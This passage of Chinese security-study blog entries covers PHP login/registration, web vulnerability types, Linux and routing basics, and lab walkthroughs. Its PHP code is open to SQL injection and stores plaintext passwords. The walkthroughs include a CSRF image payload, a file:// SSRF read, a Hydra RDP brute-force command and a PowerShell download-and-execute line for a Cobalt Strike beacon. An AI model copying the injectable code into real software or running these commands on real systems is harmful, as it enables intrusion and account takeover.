btn-primary&quot; value=&quot;登录&quot;&gt;                &lt;input type=&quot;button&quot; class=&quot;btn btn-secondary&quot; value=&quot;注册&quot; onclick=&quot;window.location.href=&#x27;register.php&#x27;&quot;&gt;            &lt;/div&gt;        &lt;/form&gt;    &lt;/div&gt;&lt;/html&gt;
+
+④美化效果
+
+美化之后就比较顺眼
+⑤编写php处理逻辑
+&lt;?php//数据库配置$servername = &quot;localhost&quot;;$dbusername = &quot;root&quot;;$dbpassword = &quot;root&quot;;$dbname = &quot;cms&quot;;//后端处理前端提交的参数if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;    $username = $_POST[&#x27;username&#x27;];    $password = $_POST[&#x27;password&#x27;];    //建立数据库连接    $conn = @mysqli_connect($servername,$dbusername,$dbpassword,$dbname);        //执行sql语句，查询unmae和pass，将结果赋值给变量数组$row    $sql = &quot;select uname,pass from user where username=&#x27;$username&#x27;&quot;;     $result = mysqli_query($conn,$sql);    $row = mysqli_fetch_assoc($result);        //判断是否存在用户，有则执行下一个if    if($row)&#123;        //如果密码正确，则成功登录，跳转到主页面        if($row[&#x27;pass&#x27;] == $password)&#123;            echo &quot;登录成功&quot;;            header(&quot;Location:good.html&quot;);            exit;                        //输入密码和数据库中查询的密码不匹配，则报错        &#125;else&#123;            echo &quot;用户名或密码错误&quot;;        &#125;                //如果不存在用户，则报错    &#125;else&#123;		echo &quot;用户名或密码错误&quot;;		exit;	&#125;&#125;    ?&gt;
+
+将php代码整合到html，实现登录功能的前后端逻辑
+3、登录页面引入注册功能①编写代码
+在登录页面已经设置了一个点击注册跳转，那么现在需要一个注册页面
+&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;注册&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;        用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;        密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;        &lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt;    &lt;/form&gt;&lt;/body&gt;
+
+这是注册前端页面源代码，需要做个美化
+&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;注册&lt;/title&gt;    &lt;style&gt;        * &#123;            margin: 0;            padding: 0;            box-sizing: border-box;            font-family: &#x27;Segoe UI&#x27;, Tahoma, Geneva, Verdana, sans-serif;        &#125;                body &#123;            background-color: #f5f7fa;            background-image: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);            display: flex;            justify-content: center;            align-items: center;            min-height: 100vh;            padding: 20px;        &#125;                .container &#123;            background-color: white;            border-radius: 12px;            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);            padding: 40px;            width: 100%;            max-width: 400px;            transition: transform 0.3s ease;        &#125;                .container:hover &#123;            transform: translateY(-5px);        &#125;                h2 &#123;            text-align: center;            margin-bottom: 30px;            color: #333;            font-weight: 600;            position: relative;        &#125;                h2::after &#123;            content: &#x27;&#x27;;            position: absolute;            bottom: -10px;            left: 50%;            transform: translateX(-50%);            width: 50px;            height: 3px;            background-color: #4a90e2;            border-radius: 3px;        &#125;                .form-group &#123;            margin-bottom: 25px;            position: relative;        &#125;                .form-group label &#123;            display: block;            margin-bottom: 8px;            color: #555;            font-weight: 500;            font-size: 14px;        &#125;                .form-group input[type=&quot;text&quot;],        .form-group input[type=&quot;password&quot;] &#123;            width: 100%;            padding: 12px 15px;            border: 1px solid #ddd;            border-radius: 6px;            font-size: 16px;            transition: all 0.3s ease;            background-color: #f9f9f9;        &#125;                .form-group input[type=&quot;text&quot;]:focus,        .form-group input[type=&quot;password&quot;]:focus &#123;            border-color: #4a90e2;            outline: none;            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.2);            background-color: white;        &#125;                .btn &#123;            width: 100%;            padding: 12px;            border: none;            border-radius: 6px;            font-size: 16px;            font-weight: 600;            cursor: pointer;            transition: all 0.3s ease;            background-color: #4a90e2;            color: white;            position: relative;            overflow: hidden;        &#125;                .btn:hover &#123;            background-color: #3a7bc8;        &#125;                .btn:active &#123;            transform: scale(0.98);        &#125;                .btn::after &#123;            content: &#x27;&#x27;;            position: absolute;            top: 50%;            left: 50%;            width: 5px;            height: 5px;            background: rgba(255, 255, 255, 0.5);            border-radius: 50%;            transform: translate(-50%, -50%);            opacity: 0;        &#125;                .btn:active::after &#123;            animation: ripple 0.6s linear;        &#125;                @keyframes ripple &#123;            0% &#123;                width: 5px;                height: 5px;                opacity: 0.5;            &#125;            100% &#123;                width: 300px;                height: 300px;                opacity: 0;            &#125;        &#125;                /* 响应式设计 */        @media (max-width: 480px) &#123;            .container &#123;                padding: 30px 20px;            &#125;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h2&gt;用户注册&lt;/h2&gt;        &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;            &lt;div class=&quot;form-group&quot;&gt;                &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;                &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;            &lt;/div&gt;            &lt;div class=&quot;form-group&quot;&gt;                &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;                &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;            &lt;/div&gt;            &lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;注册&lt;/button&gt;        &lt;/form&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
+
+这是美化后的代码，看一下效果
+
+②添加后端
+需要编写后端代码，来完善注册功能
+&lt;?php$servername = &quot;localhost&quot;;$dbusername = &quot;root&quot;;$dbpassword = &quot;root&quot;;$dbname = &quot;cms&quot;;//处理前端输入数据if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;	@$username = $_POST[&#x27;username&#x27;];	@$password = $_POST[&#x27;password&#x27;];	//连接数据库    $conn = mysqli_connect($servername,$dbusername,$dbpassword,$dbname);	$sql = &quot;select uname from user where uname = &#x27;$username&#x27;&quot;;	$result = mysqli_query($conn,$sql);	$row = mysqli_fetch_assoc($result);	//判断用户是否存在    if($row[&#x27;uname&#x27;] != $username)&#123; 		$sql = &quot;insert into cms.user(uname,pass) value (&#x27;$username&#x27;,&#x27;$password&#x27;)&quot;;	    $result = mysqli_query($conn,$sql);		$registerchack = true;	    //注册成功跳转到登录页面        if($registerchack)&#123;		    header(&#x27;Location:/login.php&#x27;,true,301);		    exit();	    &#125;else&#123;		    echo &quot;注册失败&quot;;	    &#125;	&#125;else&#123;		echo &quot;用户名已存在&quot;;		exit;	&#125;	&#125;?&gt;
+
+③效果验证
+输入用户名为admin，密码admin
+
+成功跳转，并成功创建了一个用户
+我们来验证输入重复用户名注册
+
+显示用户名已存在
+]]></content>
+  </entry>
+  <entry>
+    <title>web练习5</title>
+    <url>/2025/08/15/web%E7%BB%83%E4%B9%A05/</url>
+    <content><![CDATA[一、常见web漏洞的成因和危害1.SQL 注入相关漏洞
+基础 SQL 注入（SQLi）
+
+​       成因：对用户的输入数据未经过滤，导致可以执行sql语句
+​       危害：数据库数据泄露、篡改、删除，甚至获取服务器控制权
+
+报错注入
+成因：数据库错误信息直接返回前端
+危害：泄露数据库敏感信息
+
+二次注入（存储型 SQL 注入的特殊形式，输入存储后触发）
+成因：恶意输入先被存储，后续操作中触发 SQL 执行
+危害：绕过初次过滤，实现持久化攻击，如修改密码
+
+堆叠注入（通过分号执行多条 SQL 语句）
+成因：支持分号;执行多条 SQL 语句
+危害：数据库数据泄露、篡改、删除，甚至获取服务器控制权
+
+布尔盲注（基于查询结果的真假判断）
+成因：页面无显式错误信息，但可通过真&#x2F;假或延迟响应判断结果
+危害：隐蔽地提取数据
+
+时间盲注（基于延迟响应判断）
+成因：页面无显式错误信息，但可通过真&#x2F;假或延迟响应判断结果
+危害：隐蔽地提取数据
+
+GET 注入（URL 参数）
+
+POST 注入（表单数据）
+
+Cookie 注入（Cookie 字段）
+
+User-Agent 注入（请求头字段）
+
+Referer 注入（请求头字段）
+成因：未对 HTTP 请求各参数（URL&#x2F;表单&#x2F;Cookie&#x2F;Header）过滤
+危害：与其他sql注入相同，攻击入口更广泛
+
+
+2.跨站脚本（XSS）相关漏洞
+存储型 XSS（恶意脚本存储到服务器，持久触发）
+成因：恶意脚本存入数据库，其他用户访问时触发
+危害：盗取用户 Cookie、会话劫持、钓鱼攻击、传播蠕虫
+
+反射型 XSS（脚本随请求返回，一次性触发）
+成因：恶意脚本随 URL 参数返回页面，需用户点击触发
+危害：短时攻击，如钓鱼链接，窃取当前用户敏感信息
+
+DOM 型 XSS（客户端 DOM 解析时执行，不经过服务器）
+成因：前端 JavaScript 动态修改 DOM 时未转义输入
+危害：无需服务器参与，纯客户端攻击
+
+
+3.命令注入相关漏洞
+直接命令注入（用户输入直接拼接系统命令执行）
+成因：用户输入直接拼接系统命令，如 &#96;; rm -rf &#x2F;
+危害：执行任意系统命令、删文件、挖矿
+
+间接命令注入（通过文件上传、配置文件等间接触发）
+成因：通过上传文件&#x2F;配置文件触发命令执行
+危害：执行任意系统命令、删文件、挖矿
+
+
+4.文件操作相关漏洞①文件上传漏洞（细分 4 类）
+后缀名绕过（如.php5、.phtml）
+成因：未校验扩展名
+危害：上传 WebShell，控制服务器
+
+MIME 类型绕过（修改Content-Type）
+成因：仅校验客户端 Content-Type
+危害：上传 WebShell，控制服务器
+
+路径遍历结合上传（如..&#x2F;shell.php）
+成因：文件名含 ../
+危害：将恶意文件写入非预期目录
+
+解析漏洞利用（如 IIS&#x2F;nginx 解析缺陷）
+成因：服务器缺陷
+危害：将恶意文件写入非预期目录
+
+
+②文件包含漏洞
+本地文件包含（LFI，包含服务器本地文件）
+成因：动态包含文件时未限制路径
+危害：读取敏感文件、执行代码注入
+
+远程文件包含（RFI，包含远程恶意文件）
+成因：允许包含远程 URL
+危害：直接执行远程恶意代码
+
+任意文件读取（未授权读取敏感文件，如&#x2F;etc&#x2F;passwd）
+成因：未校验文件路径参数
+危害：泄露源码、配置文件、数据库凭证
+
+任意文件删除（未授权删除服务器文件）
+成因：删除操作未授权校验
+危害：删除关键日志或配置文件
+
+任意文件写入（未授权写入文件，如写入后门）
+成因：写入操作未限制路径与内容
+危害：写入 WebShell 或恶意脚本
+
+
+5.认证与授权漏洞
+弱口令（密码复杂度不足，易被暴力破解）
+成因：用户或管理员使用简单密码&#x2F;未改默认密码
+危害：账号被爆破，攻击者直接登录
+
+默认口令（未修改设备 &#x2F; 系统默认账号密码）
+成因：用户或管理员使用简单密码&#x2F;未改默认密码
+危害：账号被爆破，攻击者直接登录
+
+密码明文传输（未加密传输，如 HTTP 传输密码）
+成因：未进行加密处理，未使用 HTTPS 加密
+危害：中间人窃取密码
+
+会话固定（固定会话 ID，诱导用户使用）
+成因：会话 ID 不变或未绑定 IP&#x2F;User-Agent
+危害：攻击者劫持合法会话冒充用户
+
+会话劫持（窃取会话 ID 冒充用户）
+成因：会话 ID 不变或未绑定 IP&#x2F;User-Agent
+危害：攻击者劫持合法会话冒充用户
+
+水平越权（访问同权限用户数据，如查他人订单）
+成因：未校验数据归属，如id等
+危害：访问他人敏感数据
+
+垂直越权（低权限访问高权限功能，如普通用户进后台）
+成因：未校验用户角色，管理员id或用户id
+危害：执行高权限操作
+
+权限提升（通过漏洞获取更高权限）
+成因：存在具有高权限文件，如suid
+危害：提升权限
+
+认证绕过（直接跳过登录验证，如逻辑缺陷）
+成因：逻辑缺陷
+危害：通过对请求包进行修改
+
+多因素认证缺失（仅单因素认证，易被破解）
+成因：设置简单验证方式，如仅密码认证，无验证码，生物验证等
+危害：若密码可爆破，则被盗取
+
+密码重置逻辑漏洞（如验证码复用、重置链接永久有效）
+成因：验证码复用、重置链接无时效限制
+危害：重置任意用户密码
+
+
+6.跨站请求伪造（CSRF）相关漏洞
+基础 CSRF（诱导用户在已登录状态执行操作）
+成因：关键操作（如转账）未校验请求来源
+危害：诱骗用户执行非自愿操作
+
+GET 型 CSRF（利用 GET 请求的幂等性触发）
+成因：利用 GET 请求幂等性或自动提交表单触发，配合xss漏洞利用
+危害：诱骗用户执行非自愿操作
+
+POST 型 CSRF（利用表单自动提交触发）
+成因：配合xss漏洞利用
+危害：诱骗用户执行非自愿操作
+
+
+7.逻辑漏洞
+支付逻辑漏洞（如价格篡改、重复支付退款）
+成因：前端校验价格&#x2F;数量，后端未二次校验
+危害：0元购、重复退款、无限刷积分
+
+订单逻辑漏洞（如越权修改订单状态、重复下单）
+成因：前端校验价格&#x2F;数量，后端未二次校验
+危害：0元购、重复退款、无限刷积分
+
+注册逻辑漏洞（如重复注册、批量注册、手机号复用）
+成因：手机号&#x2F;邮箱未绑定用户、验证码泄露或复用
+危害：批量注册垃圾账号
+
+密码找回逻辑漏洞（如跳过验证步骤、验证码泄露）
+成因：手机号&#x2F;邮箱未绑定用户、验证码泄露或复用
+危害：盗号
+
+验证码逻辑漏洞（如验证码过期时间长、可重复使用）
+成因：手机号&#x2F;邮箱未绑定用户、验证码泄露或复用
+危害：批量注册垃圾账号、盗号
+
+业务流程绕过（如跳过关键步骤完成操作）
+成因：未强制顺序执行步骤
+危害：破坏业务规则，造成资损
+
+
+8.XML 与数据格式相关漏洞
+XML 外部实体注入（XXE，利用外部实体读取文件 &#x2F; 执行命令）
+成因：解析 XML 时启用外部实体
+危害：读取服务器文件、SSRF、拒绝服务
+
+XPath 注入（XPath 查询未过滤，导致数据泄露）
+成因：XPath 查询拼接用户输入未过滤
+危害：泄露 XML 数据库内容
+
+
+9.服务器配置漏洞
+目录遍历（通过..&#x2F;等路径访问非预期目录）
+成因：未过滤路径参数中的 ..&#x2F;
+危害：读取敏感文件
+
+敏感信息泄露（如 PHPINFO、数据库错误详情、日志泄露）
+成因：通过报错导致详情暴露
+危害：泄露数据库密码、服务器路径、API 密钥
+
+服务器版本泄露（响应头暴露 Apache&#x2F;Nginx 版本）
+成因：未对版本信息隐藏
+危害：利用相应版本存在的漏洞
+
+默认页面未删除（如phpMyAdmin、test.php默认路径）
+成因：未删除默认页面
+危害：敏感信息泄露
+
+目录索引开启（未禁用自动目录列表，泄露文件结构）
+成因：未关闭 Options -Indexes
+危害：暴露目录结构，发现隐藏文件
+
+不安全 HTTP 方法（开启 PUT&#x2F;DELETE，允许文件操作）
+成因：开启 PUT&#x2F;DELETE 等方法
+危害：攻击者直接上传&#x2F;删除服务器文件
+
+CORS 配置不当（跨域资源共享规则过松，泄露数据）
+成因：响应头 Access-Control-Allow-Origin: *
+危害：恶意网站跨域读取用户敏感数据
+
+
+10.密码学与传输漏洞
+弱加密算法（如使用 MD5、SHA1 存储密码）
+成因：使用 MD5&#x2F;SHA1 存储密码
+危害：撞库
+
+密钥泄露（硬编码密钥、日志泄露密钥）
+成因：密钥容易获取
+危害：泄露敏感信息，密码爆破
+
+明文存储密码（数据库直接存储明文密码）
+成因：数据库存明文或 HTTP 传输密码
+危害：泄露敏感信息
+
+加密传输缺失（未用 HTTPS，数据明文传输）
+成因：数据库存明文或 HTTP 传输密码
+危害：泄露敏感信息
+
+SSL&#x2F;TLS 配置漏洞（支持弱加密套件、协议版本过低）
+成因：支持弱加密套件
+危害：泄露敏感信息
+
+
+11.API 与新兴技术漏洞
+API 未授权访问（接口缺少认证，直接调用）
+成因：接口无身份验证
+危害：直接获取&#x2F;篡改所有用户数据
+
+API 参数篡改（修改接口参数越权操作）
+成因：接口无身份验证
+危害：直接获取&#x2F;篡改所有用户数据
+
+
+12.其他类型漏洞
+反序列化漏洞（如 Java&#x2F;PHP 反序列化执行命令）
+成因：反序列化数据未校验，使用魔术方法
+危害：远程代码执行
+
+服务器端请求伪造（SSRF，诱导服务器请求内网资源）
+成因：服务器代理请求未限制目标
+危害：探测内网、攻击内部系统
+
+模板注入（如 Jinja2&#x2F;Twig 注入，执行代码）
+成因：用户输入直接拼接到模板
+危害：执行服务器代码
+
+
+二、pikachu暴力破解1.基于表单的暴力破解①随意输入账户密码，点击login，用yakit进行抓包
+
+
+②进入FUZZ测试
+
+③选中参数，配置字典
+
+
+④发送请求
+
+通过响应大小判断爆破成功
+2.验证码绕过(on server)①同上，抓包
+
+
+②尝试在请求包里修改账号和密码，输入新生成的验证码
+
+
+发现验证码不会过期
+③同第一关进行爆破
+
+成功爆破
+3.验证码绕过(on client)①同上，抓包，尝试修改账户和密码
+
+发现仍然不会过期
+②加载字典，爆破
+
+爆破成功
+三、Hydra爆破rdp①编写用户字典和密码字典
+vim user.txtvim pass.txt
+
+
+②开始爆破
+hydra -L user.txt -P pass.txt 192.168.18.171 rdp
+
+
+成功爆破
+]]></content>
+  </entry>
+  <entry>
+    <title>“Linux常用基础命令”</title>
+    <url>/2025/08/04/%E2%80%9CLinux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E2%80%9D/</url>
+    <content><![CDATA[linux常用基础命令一、文件管理与查询1.touch #创建文件用法：
+touch test.txt  #单个创建touch test1.txt test2.txt  #批量创建
+
+2.mkdir #创建目录用法：
+mkdir 【选项】 目录名mkdir dir/  #单级创建mkdir -p dir1/dir2  #递归创建
+
+3.rm #删除文件及目录用法：
+rm 【选项】 文件名or目录名rm test.txt  #删除单个文件rm -r dir/  #删除整个目录及其以下所有内容rm -f test.txt  #强制删除
+
+4.cp #复制文件或目录用法：
+cp 【选项】 文件名or目录名 指定路径cp test.txt dir/  #将test.txt复制到dir/目录cp -r dir1/ dir2/  #将dir1递归复制到dir2cp -f dir1/ dir2/  #强制复制cp -i test.txt dir1/  #若有覆盖，提示确认
+
+5.mv #移动文件或重命名用法：
+mv 源文件 目标路径or名称mv old.txt nwe.txt  #重命名mv test.txt dir/  #移动test.txt到dir/目录
+
+6.ls #查看目录用法：
+ls 【选项】ls  #查看当前目录下所有文件ls -a  #显示当前目录下的隐藏文件ls -l  #长格式显示，显示各文件权限、所属主/组、时间等ls -h  #人类可读的文件大小ls -R  #递归显示子目录
+
+7.cat #查看文件用法：
+cat 【选项】 文件名cat test.txt  #查看test.txt文件的内容cat test1.txt test2.txt  #查看多个文件内容cat test1.txt test2.txt &gt; test3.txt  #合并文件 cat -n  #显示行号cat -b  #显示行号（忽略空行）cat -s  #压缩连续空行为一行cat -E  #在行尾显示$符号
+
+高阶用法：
+创建文件cat &gt; test.txt &lt;&lt; EOF  #创建test.txt文件示例[root@localhost test]# cat &gt; test789.txt &lt;&lt;EOF&gt; qwer&gt; EOF[root@localhost test]# cat test789.txt qwer
+
+cat test1.txt &gt; test2.txt  #将test1的内容追加到test2末尾
+
+8.tail #查看文件末尾内容用法：
+tail 【选项】 文件名tail test.txt  #查看末尾10行内容tail -n 20 test.txt  #查看末尾20行，-n用于指定显示行数tail -f /var/log/message  #实时追踪变化
+
+9.grep #进行正则匹配文本内容用法：
+grep 【选项】 “搜索模式” 文件名or目录grep -i &quot;error&quot; file  #忽略大小写grep -v &quot;debug&quot; file  #反向匹配，排除搜索模式grep -n &quot;qwe&quot; file  #显示行号grep -c &quot;eqwe&quot; file  #统计行数grep -r &quot;123&quot; /etc/  #递归搜索目录grep -w &quot;qwe&quot; file  #精确匹配grep -o &quot;[0-9]&quot; file  #仅输出匹配内容grep -A 12 &quot;qwe&quot; file  #显示匹配行以及后12行 grep -B 14 &quot;qwe&quot; file  #显示匹配行以及前14行grep -C 18 &quot;qwe&quot; file  #显示匹配行以及前后各18行
+
+]]></content>
+  </entry>
+  <entry>
+    <title>后渗透基础-路由转发</title>
+    <url>/2025/08/07/%E5%90%8E%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%801-%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91/</url>
+    <content><![CDATA[一、路由转发简介1.路由转发是什么路由转发（IP Forwarding）是计算机网络中的核心机制，指路由器或具备路由功能的设备根据路由表将接收到的数据包转发到目标网络。
+2.核心概念
+路由表（Routing Table）：
+存储网络地址与下一跳信息的表格，决定数据包的转发路径。
+目标网络          下一跳IP          接口             标记192.168.1.0/24   10.0.0.1         eth0             UG
+
+下一跳（Next Hop）：
+数据包转发的下一个设备或网关的 IP 地址。
+
+路由协议（如 OSPF、BGP）：
+动态更新路由表的协议，适用于大型网络（如企业网或互联网）
+
+
+3.工作流程当一个网络设备收到一个数据包时，会查看源ip和目的ip，查看目标网络是否在自己的路由表里面，如果在，则将接收到的数据包转发给下一跳地址，下一跳设备接收到数据包时，重复上述操作，直到数据包转发到目的ip。
+4.配置方法linux系统使用命令配置
+#查看路由表ip route show#添加静态路由ip route add 192.168.10.0/24 via 10.0.0.1 dev eth1ip route add：表示添加一项路由条目192.168.10.0/24：表示目标网络，子网掩码是24via 10.0.0.1：表示下一跳地址是10.0.0.1dev eth1：表示网络设备接口是dev eth1#删除路由ip route del 192.168.2.0/24
+
+配置文件持久化
+路径： &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;route-eth0 （针对接口 eth0 ）或&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ensxx
+添加内容
+to default via 10.0.0.1 dev eth0 #表示去往默认路由的下一跳地址是10.0.0.1to 192.168.2.0/24 via 10.0.0.2 dev eth1  #表示去往192.168.2.0/24网段的下一跳地址是10.0.0.2
+
+二、虚拟机网络连接方式想要在虚拟机上完成路由转发案例，我们先了解一下虚拟机的网络连接方式
+1.NAT（网络地址转换）模式你的物理机相当于虚拟机的网关，虚拟机可以通过物理机来访问外部网络，但是外部网络无法直接访问虚拟机，就相当于你的物理机作为你虚拟机的路由器。
+2.桥接模式这个模式下，虚拟机就相当于一台真实主机，可以与外部网络进行通信，具有自己的ip地址，虚拟机的网络适配器与你物理机的网卡相连接，相当于与你物理机处于同一水平线。
+3.仅主机模式虚拟机完全隔离于外部网络，只能与你物理机进行通信。
+三、网络配置1.网络管理器（NetworkManager）网络管理器（NetworkManager）是一个动态网络的控制器与配置系统，它用于当网络设备可用时保持设备和连接开启并激活。
+CentOS8 默认安装网络管理器，并处于启用状态。
+#查看网络管理程序状态systemctl status NetworkManager
+
+2.网络配置方法①修改文件配置
+/etc/sysconfig/network-scripts目录下#编辑配置文件，如vim /etc/sysconfig/network-scripts/ifcfg-ens168#incfg-ens168就是你centos系统网卡对应的网络配置文件#以下是所需要配置的参数TYPE=Ethernet              #接口类型DEVICE=ens160              #设备名称，你网卡的名称ONBOOT=yes                 #开机自启，no是不自启BOOTPROTO=static           #获取ip方式，static是静态ip，还有DHCP方式IPADDR=192.168.2.254       #你分配的ip地址NETMAK=255.255.255.0       #子网掩码GATEWAY=192.168.2.1        #网关DNS1=114.114.114.114       #DNSDNS2=8.8.8.8DEFROUTE=yes               #默认路由
+
+②命令配置
+nmcli#查看网络连接nmcli connection show#启用接口nmcli connection up ensxxx#禁用接口nmcli connection down ensxxx#配置静态ipnmcli connection modify ensxxx \  type ethernet \  ip4 192.168.1.100/24 \  gateway4 192.168.1.1 \  dns &quot;8.8.8.8;8.8.4.4&quot; #配置DHCPnmcli connection modify ens160 \  type ethernet \  ip4 auto dhcp
+
+四、路由转发实验1.拓扑说明
+
+
+操作系统
+网卡
+
+
+
+windows 10
+vmnet 2（仅主机模式）
+
+
+centos 8
+vmnet 2 、 vmnet 3
+
+
+kali
+vmnet 3
+
+
+
+2.目标实现win10与kali能够ping通
+3.实践①kali配置ip
+#kali网络配置文件在/etc/network目录下有个interfaces文件#首先进行源文件的备份mv interfaces interfaces.back#新建一个interfaces文件vim /etc/network/interfacesauto lo                             iface lo inet loopback             #回环auto eth0                          #网络接口iface eth0 inet static             #静态路由     address 172.16.2.1            #ip地址     netmask 255.255.255.0         #掩码     gateway 172.16.2.254          #网关#重启服务systemctl restart networking
+
+②centos双网卡配置
+#centos配置文件在/etc/sysconfig/network-scripts目录下的ifcfg-ensxxx文件#双网卡的话就有两个文件#备份源配置文件mv ifcfg-ens160 ifcfg-ens160.backmv ifcfg-ens160 ifcfg-ens224.back#新建配置文件，因为这里centos相当于路由器，所以不配置网关和掩码vim ifcfg-ens160TYPE=Ethernet            #接口类型DEVICE=ens160            #网卡名称ONBOOT=yes               #开机自启动BOOTPROTO=static         #静态ipIPADDR=192.168.2.254     #ip地址DEFROUTE=yes             #默认路由，主网卡设置vim ifcfg-ens224TYPE=EthernetDEVICE=ens224ONBOOT=yesBOOTPROTO=staticIPADDR=172.16.2.254DEFROUTE=no#重启服务systemctl restart NetworkManager
+
+③win 10配置ip
+
+④测试连通性
+win10无法于kali通信
+
+win10能和centos通信
+
+kali能和centos通信
+
+⑤修改centos配置文件，开启路由转发
+在&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4目录下的ip_forward文件，这个文件默认为0且只读，但是可以通过重定向强制写入
+#0表示关闭，1表示开启echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+
+此时测试kali能否与win10通信
+
+
+成功互通
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-csrf&amp;ssrf&amp;文件包含</title>
+    <url>/2025/08/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-csrf&amp;ssrf&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[1、csrf漏洞配合存储型XSS组合拳核心思想：攻击者欺骗用户的浏览器，让其以一个已认证用户（登录用户）的身份，向目标网站发送一个非预期的请求。
+①使用admin账号，密码password进入到csrf靶场，发现具有更改密码功能
+②进行修改密码，发现是get传参，并且没有验证码校验，直接通过链接发起请求
+③将链接保存复制下来，利用标签去自动加载链接达到对修改目标密码的操作，去留言板页面插入xss代码，需配合存储型xsspayload：&lt;img src=&quot;http://192.168.18.175/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; style=&quot;display:none;&quot;&gt;
+
+④前端对长度进行限制，但是可以修改，然后保存
+⑤换一个浏览器，使用另一个账号登录dvwa，账号gordonb，密码abc123，进入后去访问刚才注入xss代码的页面
+
+⑥此时用户已经遭受到攻击，去到admin所在浏览器，退出登录，使用gordonb登录，密码是xss请求的123456
+成功登录！！！
+2、ssrf漏洞核心思想：攻击者利用一个Web应用程序的功能，欺骗后端服务器向任意一个内网或外网地址发起HTTP请求。攻击的目标不是应用程序本身，而是应用程序所能访问到的内部系统或外部第三方系统。
+①进入ssrf靶场
+url里面存在请求加载某个链接中的文件
+②通过wappalyzer得知是windows操作系统
+③读取敏感文件windows域名解析地址&quot;C:\Windows\System32\drivers\etc\hosts&quot;payload：file://C:\\Windows\System32\drivers\etc\hosts利用file伪协议来读取目标主机本地文件
+
+
+3、文件包含漏洞配合图片木马Web应用程序在引入（包含）外部文件时，未对用户传入的文件名参数进行充分的验证和过滤，导致攻击者可以操控该参数，让应用程序包含并执行非预期的恶意文件。
+函数：include()  require()  include_once()  require_once()  
+①进入includ靶场，使用本地文件包含靶场
+②在自己宿主机制作图片马创建一个正常图片png和一个一句话php文件
+
+命令行执行
+copy 1.png/b+1.php/a 123.png 
+
+
+图片马制作完成
+③进行本地包含图片马，假设已经上传上图片马，并且知道路径payload：123.png
+
+
+成功解析
+4、文件包含和文件读取的区别①文件读取编写代码test.php
+&lt;?php$filename = $_GET[&#x27;filename&#x27;];echo fgets(fopen($filename,&#x27;r&#x27;)); ?&gt;
+
+在根目录下保存两个文件123.txt和123.php
+//123.txtthis is file//123.php&lt;?php phpinfo();?&gt;
+
+
+访问test.php,输入123.txt和123.php
+
+
+文件读取是将文件以文本的方式进行打开，并不会将其解析为脚本语言
+②文件包含更改代码
+&lt;?php$filename = $_GET[&#x27;filename&#x27;];include($filename); ?&gt;
+
+
+
+文件包含会将脚本文件进行解析
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-cs工具</title>
+    <url>/2025/08/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-cs%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[1、Cobalt Strike你可以把 Cobalt Strike 理解为一个 “网络攻击的指挥控制中心”（C2, Command and Control）。攻击者（红队）先在被攻击目标（肉鸡）上植入一个小小的“木马”（叫做 Beacon），然后通过 Cobalt Strike 的服务端（团队服务器）向这些 Beacon 发送命令，Beacon 执行命令后再将结果回传。攻击者通过一个图形化的客户端来操作这一切。
+2、cs利用攻击机：kali，win11
+靶机：win7
+在kali启动cs服务端
+
+win11客户端连接服务端
+
+添加监听主机
+
+生成木马
+
+
+将muma保存到桌面
+
+利用ipc管道将文件上传到靶机
+//连接靶机net use \\靶机ip\ipc$ &lt;靶机密码&gt; /user:&lt;靶机用户名&gt;//上传到靶机c盘copy &lt;木马地址路径&gt; \\靶机ip\C$
+
+
+
+
+在靶机上双击运行木马，再回到客户端查看
+
+成功上线！！！
+执行命令查看ipconfig
+
+尝试其他上线方式
+powershell
+
+powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.18.172:9677/a&#x27;))&quot;
+
+
+
+成功上线！！！！
+搭建socks代理环境
+攻击机：win11、kali
+靶机：win7、win7克隆
+
+
+
+win11
+nat
+192.168.18.175
+
+
+
+kali
+nat
+192.168.18.172
+
+
+win7pc1
